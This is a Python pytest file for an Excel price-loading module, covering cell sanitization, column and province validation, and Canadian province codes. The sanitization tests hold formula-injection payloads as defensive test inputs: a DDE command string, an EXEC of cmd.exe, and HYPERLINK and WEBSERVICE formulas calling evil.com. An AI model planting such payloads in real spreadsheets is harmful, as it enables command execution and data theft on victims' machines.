"""Tests for Excel handler module."""
from pathlib import Path
from unittest.mock import patch, MagicMock

import pandas as pd
import pytest

from src.excel_handler import (
    sanitize_cell_value,
    load_expected_prices,
    VALID_PROVINCES,
)


class TestSanitizeCellValue:
    """Tests for cell value sanitization."""

    def test_normal_string_unchanged(self):
        """Test that normal strings pass through unchanged."""
        assert sanitize_cell_value("Pizza Pepperoni") == "Pizza Pepperoni"
        assert sanitize_cell_value("14.99") == "14.99"
        assert sanitize_cell_value("BC") == "BC"

    def test_formula_prefix_neutralized(self):
        """Test that formula prefixes are neutralized with quote."""
        assert sanitize_cell_value("=SUM(A1:A10)") == "'=SUM(A1:A10)"
        assert sanitize_cell_value("+1234567890") == "'+1234567890"
        assert sanitize_cell_value("-1234567890") == "'-1234567890"
        assert sanitize_cell_value("@username") == "'@username"

    def test_whitespace_prefix_neutralized(self):
        """Test that whitespace prefixes are neutralized."""
        assert sanitize_cell_value("\tdata") == "'\tdata"
        assert sanitize_cell_value("\rdata") == "'\rdata"
        assert sanitize_cell_value("\ndata") == "'\ndata"

    def test_dde_pattern_raises_error(self):
        """Test that DDE command patterns raise ValueError."""
        with pytest.raises(ValueError, match="malicious formula"):
            sanitize_cell_value("=CMD|' /C calc'!A0")

        with pytest.raises(ValueError, match="malicious formula"):
            sanitize_cell_value("=EXEC('cmd.exe')")

        with pytest.raises(ValueError, match="malicious formula"):
            sanitize_cell_value("=HYPERLINK(\"http://evil.com\")")

        with pytest.raises(ValueError, match="malicious formula"):
            sanitize_cell_value("=WEBSERVICE(\"http://evil.com\")")

    def test_non_string_unchanged(self):
        """Test that non-string values pass through unchanged."""
        assert sanitize_cell_value(14.99) == 14.99
        assert sanitize_cell_value(100) == 100
        assert sanitize_cell_value(None) is None


class TestLoadExpectedPrices:
    """Tests for loading expected prices from Excel."""

    @pytest.fixture
    def valid_excel_data(self):
        """Create valid test data."""
        return pd.DataFrame({
            "product_name": ["Pizza A", "Pizza B"],
            "category": ["pizzas", "pizzas"],
            "province": ["BC", "AB"],
            "expected_price": [14.99, 15.99],
        })

    @pytest.fixture
    def temp_excel_file(self, tmp_path, valid_excel_data):
        """Create a temporary Excel file with valid data."""
        filepath = tmp_path / "test_prices.xlsx"
        valid_excel_data.to_excel(filepath, index=False)
        return filepath

    def test_load_valid_file(self, temp_excel_file, valid_excel_data):
        """Test loading a valid Excel file."""
        df = load_expected_prices(temp_excel_file)

        assert len(df) == 2
        assert "product_name" in df.columns
        assert "category" in df.columns
        assert "province" in df.columns
        assert "expected_price" in df.columns

    def test_file_not_found(self, tmp_path):
        """Test FileNotFoundError for missing file."""
        with pytest.raises(FileNotFoundError):
            load_expected_prices(tmp_path / "nonexistent.xlsx")

    def test_missing_columns(self, tmp_path):
        """Test ValueError for missing required columns."""
        incomplete_df = pd.DataFrame({
            "product_name": ["Pizza A"],
            "category": ["pizzas"],
            # Missing province and expected_price
        })
        filepath = tmp_path / "incomplete.xlsx"
        incomplete_df.to_excel(filepath, index=False)

        with pytest.raises(ValueError, match="Missing required columns"):
            load_expected_prices(filepath)

    def test_invalid_province_codes(self, tmp_path):
        """Test ValueError for invalid province codes."""
        invalid_df = pd.DataFrame({
            "product_name": ["Pizza A"],
            "category": ["pizzas"],
            "province": ["XX"],  # Invalid province
            "expected_price": [14.99],
        })
        filepath = tmp_path / "invalid_province.xlsx"
        invalid_df.to_excel(filepath, index=False)

        with pytest.raises(ValueError, match="Invalid province codes"):
            load_expected_prices(filepath)

    def test_negative_price_rejected(self, tmp_path):
        """Test ValueError for negative prices."""
        negative_df = pd.DataFrame({
            "product_name": ["Pizza A"],
            "category": ["pizzas"],
            "province": ["BC"],
            "expected_price": [-14.99],  # Negative price
        })
        filepath = tmp_path / "negative.xlsx"
        negative_df.to_excel(filepath, index=False)

        with pytest.raises(ValueError, match="negative values"):
            load_expected_prices(filepath)

    def test_province_normalization(self, tmp_path):
        """Test that province codes are normalized to uppercase."""
        lowercase_df = pd.DataFrame({
            "product_name": ["Pizza A"],
            "category": ["pizzas"],
            "province": ["bc"],  # Lowercase
            "expected_price": [14.99],
        })
        filepath = tmp_path / "lowercase.xlsx"
        lowercase_df.to_excel(filepath, index=False)

        df = load_expected_prices(filepath)
        assert df["province"].iloc[0] == "BC"

    def test_column_name_normalization(self, tmp_path):
        """Test that column names are normalized."""
        weird_columns_df = pd.DataFrame({
            "Product_Name": ["Pizza A"],
            "CATEGORY": ["pizzas"],
            "Province ": ["BC"],  # Trailing space
            "Expected_Price": [14.99],
        })
        filepath = tmp_path / "weird_columns.xlsx"
        weird_columns_df.to_excel(filepath, index=False)

        df = load_expected_prices(filepath)
        assert "product_name" in df.columns


class TestValidProvinces:
    """Tests for province validation."""

    def test_all_canadian_provinces_included(self):
        """Test that all Canadian provinces and territories are valid."""
        expected_provinces = {
            "BC", "AB", "SK", "MB", "ON", "QC",
            "NB", "NS", "PE", "NL",
            "YT", "NT", "NU",
        }
        assert VALID_PROVINCES == expected_provinces
